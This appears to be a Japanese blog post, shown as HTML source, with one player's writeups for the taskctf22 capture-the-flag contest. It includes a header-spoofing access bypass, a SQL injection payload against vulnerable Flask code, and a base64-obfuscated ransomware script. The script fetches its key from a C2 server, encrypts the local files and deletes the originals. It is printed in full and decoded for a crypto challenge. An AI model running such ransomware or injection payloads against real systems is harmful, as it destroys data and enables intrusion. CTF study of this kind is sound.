@@ -1,0 +1,151 @@
+<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>[taskctf22] My own writeup - yuasa's blog</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="2022/12/03(Sat) 00:00(JST) ~ 2022/12/04(Sun) 00:00(JST)の日程で開催されたtaskctf22に参加しました.
+ユーザー名yuasaで参加し, 1814ポイント獲得して24位でした. writeupを以下に示します.
+[osint] welcome 問題 2019年のtaskctfのwelcome問題のFlagは何でしたっけ？
+解法 taskctf 2019で検索するとst98さんのwriteupが見つかり、そこにwelcome問題のflagが書かれていました。
+taskctf{let's_enj0y!} [web] robots 問題 Flagが漏洩してるって聞いたけど、本当ですか？？？
+http://34.82.208.2:31481/
+解法 問題名から推測してrobots.txtを見てみると, /admin/flagというパスが存在することがわかります.
+$ curl http://34.82.208.2:31481/robots.txt User-Agent: * Disallow: /admin/flag% /admin/flagを見ると, 内部のIPアドレスではないからダメと言われます.
+$ curl http://34.82.208.2:31481/admin/flag ... <div class=&#34;container&#34;> <h1>401 Unauthorized</h1> <p>153.246.178.236 is not internal IP address :(</p> </div> ... あるあるの手法であるX-Forwarded-Forヘッダーを127.0.0.1に書き換えるやつを試すとflagが取得できました.
+$ curl -H 'X-Forwarded-For: 127.0.0.1' http://34.82.208.2:31481/admin/flag ... <h1>flag</h1> <p>taskctf{th15_c0ntr0l_y0u_th1nk_y0u_h4ve_1s_4n_1llu5i0n}</p> taskctf{th15_c0ntr0l_y0u_th1nk_y0u_h4ve_1s_4n_1llu5i0n} [web] first 問題文 運営している小さな掲示板が100ユーザを達成しました 🎉
+そこで、メンテ明けの12/6に100番目ちょうどの登録をしたユーザをトップページで掲載したいので、ユーザ名を taskctf{ユーザ名} で教えてください！
+http://34.82.208.2:31555/"><meta property="og:image" content><meta property="og:title" content="[taskctf22] My own writeup"><meta property="og:description" content="2022/12/03(Sat) 00:00(JST) ~ 2022/12/04(Sun) 00:00(JST)の日程で開催されたtaskctf22に参加しました.
+ユーザー名yuasaで参加し, 1814ポイント獲得して24位でした. writeupを以下に示します.
+[osint] welcome 問題 2019年のtaskctfのwelcome問題のFlagは何でしたっけ？
+解法 taskctf 2019で検索するとst98さんのwriteupが見つかり、そこにwelcome問題のflagが書かれていました。
+taskctf{let's_enj0y!} [web] robots 問題 Flagが漏洩してるって聞いたけど、本当ですか？？？
+http://34.82.208.2:31481/
+解法 問題名から推測してrobots.txtを見てみると, /admin/flagというパスが存在することがわかります.
+$ curl http://34.82.208.2:31481/robots.txt User-Agent: * Disallow: /admin/flag% /admin/flagを見ると, 内部のIPアドレスではないからダメと言われます.
+$ curl http://34.82.208.2:31481/admin/flag ... <div class=&#34;container&#34;> <h1>401 Unauthorized</h1> <p>153.246.178.236 is not internal IP address :(</p> </div> ... あるあるの手法であるX-Forwarded-Forヘッダーを127.0.0.1に書き換えるやつを試すとflagが取得できました.
+$ curl -H 'X-Forwarded-For: 127.0.0.1' http://34.82.208.2:31481/admin/flag ... <h1>flag</h1> <p>taskctf{th15_c0ntr0l_y0u_th1nk_y0u_h4ve_1s_4n_1llu5i0n}</p> taskctf{th15_c0ntr0l_y0u_th1nk_y0u_h4ve_1s_4n_1llu5i0n} [web] first 問題文 運営している小さな掲示板が100ユーザを達成しました 🎉
+そこで、メンテ明けの12/6に100番目ちょうどの登録をしたユーザをトップページで掲載したいので、ユーザ名を taskctf{ユーザ名} で教えてください！
+http://34.82.208.2:31555/"><meta property="og:type" content="article"><meta property="og:url" content="/posts/29/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-12-04T00:53:41+09:00"><meta property="article:modified_time" content="2022-12-04T00:53:41+09:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="[taskctf22] My own writeup"><meta name=twitter:description content="2022/12/03(Sat) 00:00(JST) ~ 2022/12/04(Sun) 00:00(JST)の日程で開催されたtaskctf22に参加しました.
+ユーザー名yuasaで参加し, 1814ポイント獲得して24位でした. writeupを以下に示します.
+[osint] welcome 問題 2019年のtaskctfのwelcome問題のFlagは何でしたっけ？
+解法 taskctf 2019で検索するとst98さんのwriteupが見つかり、そこにwelcome問題のflagが書かれていました。
+taskctf{let's_enj0y!} [web] robots 問題 Flagが漏洩してるって聞いたけど、本当ですか？？？
+http://34.82.208.2:31481/
+解法 問題名から推測してrobots.txtを見てみると, /admin/flagというパスが存在することがわかります.
+$ curl http://34.82.208.2:31481/robots.txt User-Agent: * Disallow: /admin/flag% /admin/flagを見ると, 内部のIPアドレスではないからダメと言われます.
+$ curl http://34.82.208.2:31481/admin/flag ... <div class=&#34;container&#34;> <h1>401 Unauthorized</h1> <p>153.246.178.236 is not internal IP address :(</p> </div> ... あるあるの手法であるX-Forwarded-Forヘッダーを127.0.0.1に書き換えるやつを試すとflagが取得できました.
+$ curl -H 'X-Forwarded-For: 127.0.0.1' http://34.82.208.2:31481/admin/flag ... <h1>flag</h1> <p>taskctf{th15_c0ntr0l_y0u_th1nk_y0u_h4ve_1s_4n_1llu5i0n}</p> taskctf{th15_c0ntr0l_y0u_th1nk_y0u_h4ve_1s_4n_1llu5i0n} [web] first 問題文 運営している小さな掲示板が100ユーザを達成しました 🎉
+そこで、メンテ明けの12/6に100番目ちょうどの登録をしたユーザをトップページで掲載したいので、ユーザ名を taskctf{ユーザ名} で教えてください！
+http://34.82.208.2:31555/"><script src=/js/feather.min.js></script>
+<link href=/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link id=darkModeStyle rel=stylesheet type=text/css href=/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css media="(prefers-color-scheme: dark)"><link rel=icon type=image/png href=/images/favicon.ico></head><body><div class=content><header><div class=main><a href=/>yuasa's blog</a></div><nav><a href=/>Home</a>
+<a href=/posts>Posts</a>
+<a href=/tags>Tags</a></nav></header><main><article><div class=title><h1 class=title>[taskctf22] My own writeup</h1><div class=meta>Posted on Dec 4, 2022</div></div><nav id=TableOfContents><ol><li><a href=#osint-welcome>[osint] welcome</a><ol><li><a href=#問題>問題</a></li><li><a href=#解法>解法</a></li></ol></li><li><a href=#web-robots>[web] robots</a><ol><li><a href=#問題-1>問題</a></li><li><a href=#解法-1>解法</a></li></ol></li><li><a href=#web-first>[web] first</a><ol><li><a href=#問題文>問題文</a></li><li><a href=#解法-2>解法</a></li></ol></li><li><a href=#misc-ransomware>[misc] ransomware</a><ol><li><a href=#問題文-1>問題文</a></li><li><a href=#解法-3>解法</a></li></ol></li><li><a href=#osint-ramen>[osint] ramen</a><ol><li><a href=#問題文-2>問題文</a></li><li><a href=#解法-4>解法</a></li></ol></li><li><a href=#osint-kofun>[osint] kofun</a><ol><li><a href=#問題-2>問題</a></li><li><a href=#解法-5>解法</a></li></ol></li><li><a href=#感想>感想</a></li></ol></nav><section class=body><p>2022/12/03(Sat) 00:00(JST) ~ 2022/12/04(Sun) 00:00(JST)の日程で開催されたtaskctf22に参加しました.</p><p>ユーザー名<code>yuasa</code>で参加し, 1814ポイント獲得して24位でした.
+writeupを以下に示します.</p><h1 id=osint-welcome>[osint] welcome</h1><h2 id=問題>問題</h2><p>2019年のtaskctfのwelcome問題のFlagは何でしたっけ？</p><h2 id=解法>解法</h2><p><code>taskctf 2019</code>で検索すると<a href=https://st98.github.io/diary/posts/2019-12-06-taskctf.html>st98さんのwriteup</a>が見つかり、そこにwelcome問題のflagが書かれていました。</p><pre tabindex=0><code>taskctf{let&#39;s_enj0y!}
+</code></pre><h1 id=web-robots>[web] robots</h1><h2 id=問題-1>問題</h2><p>Flagが漏洩してるって聞いたけど、本当ですか？？？</p><p>http://34.82.208.2:31481/</p><h2 id=解法-1>解法</h2><p>問題名から推測して<code>robots.txt</code>を見てみると, <code>/admin/flag</code>というパスが存在することがわかります.</p><pre tabindex=0><code>$ curl http://34.82.208.2:31481/robots.txt
+User-Agent: *
+Disallow: /admin/flag%    
+</code></pre><p><code>/admin/flag</code>を見ると, 内部のIPアドレスではないからダメと言われます.</p><pre tabindex=0><code>$ curl http://34.82.208.2:31481/admin/flag
+...
+&lt;div class=&#34;container&#34;&gt;
+    &lt;h1&gt;401 Unauthorized&lt;/h1&gt;
+    &lt;p&gt;153.246.178.236 is not internal IP address :(&lt;/p&gt;
+&lt;/div&gt;
+...
+</code></pre><p>あるあるの手法である<a href=https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/X-Forwarded-For>X-Forwarded-For</a>ヘッダーを<code>127.0.0.1</code>に書き換えるやつを試すとflagが取得できました.</p><pre tabindex=0><code>$ curl -H &#39;X-Forwarded-For: 127.0.0.1&#39; http://34.82.208.2:31481/admin/flag
+...
+    &lt;h1&gt;flag&lt;/h1&gt;
+    &lt;p&gt;taskctf{th15_c0ntr0l_y0u_th1nk_y0u_h4ve_1s_4n_1llu5i0n}&lt;/p&gt;
+</code></pre><pre tabindex=0><code>taskctf{th15_c0ntr0l_y0u_th1nk_y0u_h4ve_1s_4n_1llu5i0n}
+</code></pre><h1 id=web-first>[web] first</h1><h2 id=問題文>問題文</h2><p>運営している小さな掲示板が100ユーザを達成しました 🎉</p><p>そこで、メンテ明けの12/6に100番目ちょうどの登録をしたユーザをトップページで掲載したいので、ユーザ名を taskctf{ユーザ名} で教えてください！</p><p>http://34.82.208.2:31555/</p><h2 id=解法-2>解法</h2><p>配布されたapiサーバのコードを見ると, クエリパラメータを受け取ってSQL文にそのまま代入おり, SQLインジェクションが可能な状態になっています.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.py data-lang=:.py><span style=display:flex><span>q <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;q&#39;</span>) <span style=color:#f92672>is</span> <span style=color:#f92672>not</span> <span style=color:#66d9ef>None</span>:
+</span></span><span style=display:flex><span>    q <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;q&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>results <span style=color:#f92672>=</span> <span style=color:#66d9ef>None</span>
+</span></span><span style=display:flex><span>c <span style=color:#f92672>=</span> sqlite3<span style=color:#f92672>.</span>connect(db_name)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>    cur <span style=color:#f92672>=</span> c<span style=color:#f92672>.</span>cursor()
+</span></span><span style=display:flex><span>    cur<span style=color:#f92672>.</span>execute(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;SELECT posts.id, users.name, posts.body FROM posts INNER JOIN users ON posts.user_name = users.name AND posts.body LIKE </span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>%</span><span style=color:#e6db74>{</span>q<span style=color:#e6db74>}</span><span style=color:#e6db74>%</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>    results <span style=color:#f92672>=</span> cur<span style=color:#f92672>.</span>fetchall()
+</span></span><span style=display:flex><span><span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
+</span></span><span style=display:flex><span>    traceback<span style=color:#f92672>.</span>print_exc()
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;error: </span><span style=color:#e6db74>{</span>e<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>, <span style=color:#ae81ff>500</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>finally</span>:
+</span></span><span style=display:flex><span>    c<span style=color:#f92672>.</span>close()
+</span></span></code></pre></div><p>100番目に登録されたユーザーのユーザー名が欲しいです. そこで, UNION句を利用して100件ユーザーを取得し, HTMLにユーザーIDとユーザー名を表示させます. 以下のクエリを実行します.</p><pre tabindex=0><code>http://34.82.208.2:31555/?q=hoge&#39; UNION SELECT posts.id, users.id, users.name FROM posts INNER JOIN users LIMIT 100--
+</code></pre><p><img src=/images/posts/29/sqli.png alt=sqli></p><p>100番目のユーザーは<code>Satomi_Kato</code>であることがわかります.</p><pre tabindex=0><code>taskctf{Satomi_Kato}
+</code></pre><h1 id=misc-ransomware>[misc] ransomware</h1><h2 id=問題文-1>問題文</h2><p>友人が誕生日祝いで送ってきたスクリプトを実行したら、お手製ランサムで手元のFlagを暗号化されてしまいました。どうにかして復元できないでしょうか？</p><h2 id=解法-3>解法</h2><p>以下の<code>hdb.sh</code>が配布されます.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:hdb.sh data-lang=:hdb.sh><span style=display:flex><span><span style=color:#75715e>#!/bin/sh
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>echo <span style=color:#e6db74>&#34;IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwoKaW1wb3J0IHJlcXVlc3RzCmltcG9ydCBnbG9iCmltcG9ydCBvcwoKQzIgPSAiaHR0cHM6Ly9jMi50YXNrNDIzMy5kZXYvYkQ3YkI3cGM1N2QyIgoKZGVmIG1haW4oKToKICAgICMgZ2V0IGEga2V5IGZyb20gYSBjMiBzZXJ2ZXIKICAgIGtleSA9IGludChyZXF1ZXN0cy5nZXQoQzIpLnRleHQpCgogICAgZmlsZXMgPSBnbG9iLmdsb2IoJy4vKicpCiAgICAjIGFkZGVkIGZvciBDVEY6KQogICAgYXNzZXJ0ICIuL3Rhc2tjdGZfZmxhZy50eHQiIGluIGZpbGVzCgogICAgIyBlbmNyeXB0IGFsbCBmaWxlcwogICAgZm9yIGZpbGUgaW4gZmlsZXM6CiAgICAgICAgIyBpZ25vcmUgdGhpcyBzY3JpcHQgYW5kIGRpcmVjdG9yaWVzCiAgICAgICAgaWYgb3MucGF0aC5iYXNlbmFtZShmaWxlKSA9PSBvcy5wYXRoLmJhc2VuYW1lKF9fZmlsZV9fKToKICAgICAgICAgICAgY29udGludWUKICAgICAgICBpZiBub3Qgb3MucGF0aC5pc2ZpbGUoZmlsZSk6CiAgICAgICAgICAgIGNvbnRpbnVlCgogICAgICAgICMgZW5jcnlwdCBhIHRhcmdldCBmaWxlCiAgICAgICAgZGF0YSA9IE5vbmUKICAgICAgICB3aXRoIG9wZW4oZmlsZSwgJ3InKSBhcyBmOgogICAgICAgICAgICBkYXRhID0gZi5yZWFkKCkgICAgICAgIAogICAgICAgIGVuY3J5cHRlZCA9ICIiCiAgICAgICAgZm9yIGNoIGluIGRhdGE6CiAgICAgICAgICAgIGVuY3J5cHRlZCArPSBjaHIob3JkKGNoKSBeIGtleSkKICAgICAgICB3aXRoIG9wZW4oZiJ7ZmlsZX0uZW5jcnlwdGVkIiwgJ3cnKSBhcyBmOgogICAgICAgICAgICBmLndyaXRlKGVuY3J5cHRlZCkKICAgICAgICAKICAgICAgICAjIGRlbGV0ZSB0aGUgcmF3IGZpbGUKICAgICAgICBvcy5yZW1vdmUoZmlsZSkKICAgIAogICAgcHJpbnQoJ1wwMzNbMzFtISEhIFlPVVIgRkxBRyBIQVMgQkVFTiBFTkNSWVBURUQgISEhXDAzM1swbScpCiAgICBwcmludCgnXDAzM1szMW1Zb3UgaGF2ZSB0d28gY2hvaWNlcy4gVHJlYXQgbWUgd2hlbiBJIHNlZSB5b3UgbmV4dCB0aW1lLCBvciBkZWNyeXB0IGl0IHlvdXJzZWxmIGlmIHlvdSBjYW4gbG9sLlwwMzNbMG0nKQoKaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoKICAgIG1haW4oKQo=&#34;</span> | base64 -d | python3
+</span></span></code></pre></div><p><code>hdb.sh</code>に記載されているbase64エンコードされたpythonコードをデコードすると以下が得られます.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.py data-lang=:.py><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> glob
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>C2 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;https://c2.task4233.dev/bD7bB7pc57d2&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
+</span></span><span style=display:flex><span>    <span style=color:#75715e># get a key from a c2 server</span>
+</span></span><span style=display:flex><span>    key <span style=color:#f92672>=</span> int(requests<span style=color:#f92672>.</span>get(C2)<span style=color:#f92672>.</span>text)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    files <span style=color:#f92672>=</span> glob<span style=color:#f92672>.</span>glob(<span style=color:#e6db74>&#39;./*&#39;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#75715e># added for CTF:)</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>assert</span> <span style=color:#e6db74>&#34;./taskctf_flag.txt&#34;</span> <span style=color:#f92672>in</span> files
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># encrypt all files</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> file <span style=color:#f92672>in</span> files:
+</span></span><span style=display:flex><span>        <span style=color:#75715e># ignore this script and directories</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>basename(file) <span style=color:#f92672>==</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>basename(__file__):
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>continue</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> os<span style=color:#f92672>.</span>path<span style=color:#f92672>.</span>isfile(file):
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>continue</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e># encrypt a target file</span>
+</span></span><span style=display:flex><span>        data <span style=color:#f92672>=</span> <span style=color:#66d9ef>None</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>with</span> open(file, <span style=color:#e6db74>&#39;r&#39;</span>) <span style=color:#66d9ef>as</span> f:
+</span></span><span style=display:flex><span>            data <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>read()        
+</span></span><span style=display:flex><span>        encrypted <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> ch <span style=color:#f92672>in</span> data:
+</span></span><span style=display:flex><span>            encrypted <span style=color:#f92672>+=</span> chr(ord(ch) <span style=color:#f92672>^</span> key)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>file<span style=color:#e6db74>}</span><span style=color:#e6db74>.encrypted&#34;</span>, <span style=color:#e6db74>&#39;w&#39;</span>) <span style=color:#66d9ef>as</span> f:
+</span></span><span style=display:flex><span>            f<span style=color:#f92672>.</span>write(encrypted)
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>        <span style=color:#75715e># delete the raw file</span>
+</span></span><span style=display:flex><span>        os<span style=color:#f92672>.</span>remove(file)
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[31m!!! YOUR FLAG HAS BEEN ENCRYPTED !!!</span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[0m&#39;</span>)
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[31mYou have two choices. Treat me when I see you next time, or decrypt it yourself if you can lol.</span><span style=color:#ae81ff>\033</span><span style=color:#e6db74>[0m&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
+</span></span><span style=display:flex><span>    main()
+</span></span></code></pre></div><p>以下の部分を見ると, ファイル内のテキストを一文字ずつ同一のkeyでXORしたものを結合して暗号化されたflagとし, ファイルに入力していることがわかります.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.py data-lang=:.py><span style=display:flex><span>        <span style=color:#75715e># encrypt a target file</span>
+</span></span><span style=display:flex><span>        data <span style=color:#f92672>=</span> <span style=color:#66d9ef>None</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>with</span> open(file, <span style=color:#e6db74>&#39;r&#39;</span>) <span style=color:#66d9ef>as</span> f:
+</span></span><span style=display:flex><span>            data <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>read()        
+</span></span><span style=display:flex><span>        encrypted <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> ch <span style=color:#f92672>in</span> data:
+</span></span><span style=display:flex><span>            encrypted <span style=color:#f92672>+=</span> chr(ord(ch) <span style=color:#f92672>^</span> key)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>file<span style=color:#e6db74>}</span><span style=color:#e6db74>.encrypted&#34;</span>, <span style=color:#e6db74>&#39;w&#39;</span>) <span style=color:#66d9ef>as</span> f:
+</span></span><span style=display:flex><span>            f<span style=color:#f92672>.</span>write(encrypted)
+</span></span></code></pre></div><p>ちなみに, 暗号化されたflagは以下です.</p><pre tabindex=0><code>䔘䔍䔟䔇䔏䔘䔊䔗䔔䕜䔞䔳䕝䔟䔳䔉䕘䔟䔕䔳䕛䕜䔳䕝䔁䔜䔀䔉䔁䔉䔂䕛䔑䕦
+</code></pre><p>flagは<code>taskctf{}</code>の形式であるので, flagの一文字目は<code>t</code>です. <code>t</code>をkeyでXORしたものが, 暗号化されたflagの一文字目<code>䔘</code>になります.</p><p>ガチャガチャXORしてみて, 大体keyが17000から18000だと当たりをつけて総当たりします.
+keyが特定できたら, flagを全て復元します. 以下のpythonコードを用いてkeyの特定とflagの復元を行います.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.py data-lang=:.py><span style=display:flex><span>data <span style=color:#f92672>=</span> <span style=color:#66d9ef>None</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#34;./files/taskctf_flag.txt.encrypted&#34;</span>, <span style=color:#e6db74>&#39;r&#39;</span>) <span style=color:#66d9ef>as</span> f:
+</span></span><span style=display:flex><span>    data <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>read()        
+</span></span><span style=display:flex><span>decrypted <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;t&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># identify the key</span>
+</span></span><span style=display:flex><span>key <span style=color:#f92672>=</span> <span style=color:#66d9ef>None</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> k <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>17000</span>, <span style=color:#ae81ff>18000</span>):
+</span></span><span style=display:flex><span>    c <span style=color:#f92672>=</span> chr(ord(data[<span style=color:#ae81ff>0</span>]) <span style=color:#f92672>^</span> k)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> decrypted[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>==</span> c:
+</span></span><span style=display:flex><span>        key <span style=color:#f92672>=</span> k
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span><span style=color:#75715e># decrypt file</span>
+</span></span><span style=display:flex><span>decrypted <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> ch <span style=color:#f92672>in</span> data:
+</span></span><span style=display:flex><span>    decrypted <span style=color:#f92672>+=</span> chr(ord(ch) <span style=color:#f92672>^</span> key)
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>print(decrypted) <span style=color:#75715e># taskctf{x0r_1s_e4sy_70_1mplemen7}</span>
+</span></span></code></pre></div><pre tabindex=0><code>taskctf{x0r_1s_e4sy_70_1mplemen7}
+</code></pre><h1 id=osint-ramen>[osint] ramen</h1><h2 id=問題文-2>問題文</h2><p>このラーメン屋の名前は何でしょう？</p><p>正式名称ではなく、漢字のみで taskctf{ラーメン屋の名前}の形式で回答してください。 ラーメン屋の名前がラーメン二郎であれば、 taskctf{二郎} がFlagになります。</p><p><img src=/images/posts/29/ramen.jpg alt=ramen></p><h2 id=解法-4>解法</h2><p>Googleレンズで検索すると, こちらの<a href=https://jikomanpuku.com/2021/05/08/ramen-oomiya-rousokuya/>ブログ記事</a>が見つかります.</p><p>記載されている麻婆麺の画像が配布された画像と似ており, 店名である蝋燭屋をflagを提出してみると通りました.</p><pre tabindex=0><code>taskctf{蝋燭屋}
+</code></pre><h1 id=osint-kofun>[osint] kofun</h1><h2 id=問題-2>問題</h2><p>作問者が訪れてSNSにもアップロードしたはずの古墳の名前を思い出せなくなってしまいました&mldr; もしご存知なら教えてくれませんか？</p><p>Flagの形式はtaskctf{この古墳の名前の漢字表記} です。 例えば、 造山古墳 が答えならば taskctf{造山古墳} がフラグになります。</p><p><img src=/images/posts/29/kofun.jpeg alt=kofun></p><h2 id=解法-5>解法</h2><p>問題文に書いてあるとおり, taskさんのツイートを調べると2022年8月14日に古墳に行っていました。</p><blockquote class=twitter-tweet><p lang=ja dir=ltr>友達と古墳を20基程度回るなどした <a href=https://t.co/ZqE77AKNlY>pic.twitter.com/ZqE77AKNlY</a></p>&mdash; task4233 (@task4233) <a href="https://twitter.com/task4233/status/1558826656151654400?ref_src=twsrc%5Etfw">August 14, 2022</a></blockquote><script async src=https://platform.twitter.com/widgets.js></script><p>配布された画像とともに埴輪がある古墳の画像もアップロードされていました.
+ツイートには「友達と古墳を20基程度回るなどした」と記載されています. どんだけ回ってんねん&mldr;</p><p>ツイートの埴輪が写っている画像をGoogleレンズで検索すると, 龍角寺古墳群の中のどこかだということがわかりました.</p><p><a href=https://www.photolibrary.jp/img547/42580_5310773.html>https://www.photolibrary.jp/img547/42580_5310773.html</a></p><p>Googleマップで調べると龍角寺古墳群には20基ほど古墳が存在していることがわかり, 解答の古墳はこの中にあるのではないかと予想しました.</p><p><img src=/images/posts/29/ryukakuji-kofun.png alt=ryukakuji-kofun></p><p>しかし, それぞれに載っている写真を見ていてもそれらしいところはありません.</p><p>taskさんが一日で回ったのであれば, 付近にまだ古墳があるのではないかと思い, 少し範囲を広げて古墳を検索しました.
+すると, 上福田岩屋古墳が見つかりました. 写真に映る入り口らしきものも配布された画像のものと似ています.</p><p><img src=/images/posts/29/kamihukutaiwaya-kofun.png alt=kamihukutaiwaya-kofun></p><p>上福田岩屋古墳でflagを提出すると通りました.</p><pre tabindex=0><code>taskctf{上福田岩屋古墳}
+</code></pre><h1 id=感想>感想</h1><p>いつもはweb問しか解いている余裕がないのですが, 今回はosintやmiscなどの問題も楽しめました. osintをあまり解いたことがない人間としては, kofunの問題はosintの入門としてとても良い問題なのではないかと思いました.</p><p><a href=https://twitter.com/task4233>task4233</a>さんは毎年CTFを開催されていて本当にすごいです. 運営お疲れ様です, ありがとうございました.</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/ctf>ctf</a></li><li><a href=/tags/writeup>writeup</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/melonattacker title=GitHub><i data-feather=github></i></a>
+<a class=border></a><a class=soc href=https://x.com/melonattacker title=X><i data-feather=x></i></a>
+<a class=border></a></div><div class=footer-info>2025 © yuasa | <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
